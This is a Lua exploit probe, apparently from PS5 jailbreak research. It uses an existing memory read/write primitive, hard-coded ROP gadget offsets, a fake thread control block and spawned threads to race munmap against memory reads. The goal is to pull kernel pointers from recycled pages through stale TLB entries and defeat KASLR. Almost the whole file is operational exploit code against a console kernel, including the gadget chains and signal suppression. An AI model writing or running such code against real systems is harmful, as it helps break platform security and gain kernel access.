-- CRASH_CLASS: HIGH
-- PROBE 93b: mmap/munmap page table race (stale TLB)
--
-- Thread A calls munmap on a GPU mmap region while Thread B reads the
-- same virtual address. If B's access races the TLB invalidation (IPI),
-- it reads from a physical page that's been returned to the kernel free
-- pool. On PS5, 16KB pages make the TLB shootdown slower → wider window.
--
-- Detection: Thread B reads the region right after A's munmap. If it
-- succeeds AND returns different data from what we wrote, it hit a
-- recycled physical page. Any kernel data = KASLR defeat + possible R/W.
--
-- Primitives: mmap(477) ✓, munmap(73) ✓, thr_new(455) ✓, heap R/W ✓

print("=== PROBE 93b: mmap/munmap page table race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
-- mov rax,[rax]; ret — for read primitive
local g_mov_rax_m_rax = eb + 0x1EEBB

-- Ignore SIGSEGV(11) and SIGSYS(12)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))

local function build_child_rop(stack_base, chain_fn)
    local sb = N(stack_base)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    local fsbase_ptr = memory.alloc(8)
    wq(N(fsbase_ptr), uint64(N(fake_tcb)))
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    chain_fn(emit)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    return rsp, sb
end

local function spawn_child(stack_base)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(N(stack_base)))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
    return tid
end

-- [A] Baseline: mmap a region, write pattern, munmap, check
print("")
print("[A] BASELINE mmap/munmap")
local PAGE = 0x4000  -- 16KB
local PAGES = 4
local MAP_SIZE = PAGE * PAGES

local region = mk(477)(uint64(0), uint64(MAP_SIZE), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local region_addr = N(region)
print(string.format("  mmap region=%s size=0x%X", fmt(region), MAP_SIZE))

-- Write sentinel pattern
local SENTINEL = 0xCAFEBABE
for i = 0, MAP_SIZE - 4, PAGE do
    wd(region_addr + i, SENTINEL)
end
local readback = rd(region_addr) or 0
print(string.format("  sentinel write: 0x%X readback: 0x%X", SENTINEL, readback))

-- Munmap
local mret = sgn(mk(73)(region, uint64(MAP_SIZE)))
print(string.format("  munmap ret=%d", mret))

-- Try reading after munmap (should fail or return different data)
local post = rd(region_addr)
print(string.format("  read after munmap: %s", post and string.format("0x%X", post) or "FAULT"))

if not alive() then print("DEAD after baseline"); return end

-- [B] Race: Thread A munmaps while Thread B reads
print("")
print("[B] RACE — munmap vs read")
print("  Strategy: main allocates region, writes sentinel, spawns reader child,")
print("  then munmaps. Reader child loops reading the address.")
print("")

local ITERS = 30
local stale_reads = 0
local kptrs = 0
local faults = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- Allocate fresh region
    local reg = mk(477)(uint64(0), uint64(MAP_SIZE), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local ra = N(reg)
    if ra == 0 then
        print(string.format("  iter %d: mmap failed", iter))
        break
    end

    -- Write known pattern
    for p = 0, MAP_SIZE - 4, PAGE do
        wd(ra + p, SENTINEL)
    end

    -- Result buffer: child writes read results here (outside the mapped region)
    local READ_SAMPLES = 40
    local results = memory.alloc(READ_SAMPLES * 8 + 16)
    for i = 0, READ_SAMPLES * 8 - 1, 4 do wd(N(results) + i, 0xDEADBEEF) end
    local read_count = memory.alloc(8)
    wq(N(read_count), uint64(0))

    -- Child B: read loop — reads the target address N times, stores results
    -- Uses mov rax,[rax]; ret gadget chain to dereference the target
    local stk_B = memory.alloc(0x4000)
    local rsp_B, sb_B = build_child_rop(stk_B, function(emit)
        for s = 0, READ_SAMPLES - 1 do
            -- Read qword from target region
            emit(g_pop_rax); emit(uint64(ra + (s % PAGES) * PAGE))
            emit(g_mov_rax_m_rax)  -- rax = *rax (reads the target)
            -- Store to results[s]
            emit(g_pop_rdi); emit(uint64(N(results) + s * 8))
            emit(g_mov_m_rax)
        end
    end)

    -- Spawn reader child
    spawn_child(stk_B)

    -- Brief delay to let child start, then munmap from main thread
    for w = 1, 500 do local _ = rd(ra) end
    pcall(function() mk(73)(reg, uint64(MAP_SIZE)) end)

    -- Wait for child to complete
    for w = 1, 50000 do local _ = rd(sb_B) end

    -- Analyze results
    local this_stale = 0
    local this_kptr = 0
    local this_fault = 0
    for s = 0, READ_SAMPLES - 1 do
        local v = rq(N(results) + s * 8)
        if v == nil then
            this_fault = this_fault + 1
        else
            local h, l = get_hi_lo(v)
            if l == 0xDEADBEEF and h == 0xDEADBEEF then
                -- Unwritten — child didn't reach this slot (faulted earlier)
                this_fault = this_fault + 1
            elseif l ~= SENTINEL and l ~= 0 and h == 0 then
                -- Different non-zero value = stale read from recycled page
                this_stale = this_stale + 1
            elseif h >= 0xFFFF8000 then
                -- Kernel pointer!
                this_kptr = this_kptr + 1
                print(string.format("  iter %d sample %d: KERNEL PTR %s", iter, s, fmt(v)))
            end
        end
    end

    stale_reads = stale_reads + this_stale
    kptrs = kptrs + this_kptr
    faults = faults + this_fault

    if this_kptr > 0 then
        print(string.format("  iter %d: *** %d KERNEL POINTERS *** stale=%d fault=%d",
            iter, this_kptr, this_stale, this_fault))
    elseif this_stale > 0 then
        print(string.format("  iter %d: *** %d STALE READS *** fault=%d",
            iter, this_stale, this_fault))
    elseif iter <= 3 or iter == ITERS or iter % 10 == 0 then
        print(string.format("  iter %d: clean (fault=%d)", iter, this_fault))
    elseif iter == 4 then
        print("  ...")
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:    %d", ITERS))
print(string.format("  stale reads:   %d", stale_reads))
print(string.format("  kernel ptrs:   %d", kptrs))
print(string.format("  read faults:   %d", faults))
print(string.format("  process:       %s", alive() and "ALIVE" or "DEAD"))

if kptrs > 0 then
    print("*** KERNEL POINTER LEAK VIA STALE TLB — KASLR DEFEATED ***")
elseif stale_reads > 0 then
    print("*** STALE TLB READS CONFIRMED — race window exists ***")
elseif not alive() then
    print("*** PROCESS DIED — possible kernel panic from page table race ***")
else
    print("No stale reads detected. TLB invalidation may be synchronous (IPI barrier).")
end

print("")
print("=== 93b COMPLETE ===")
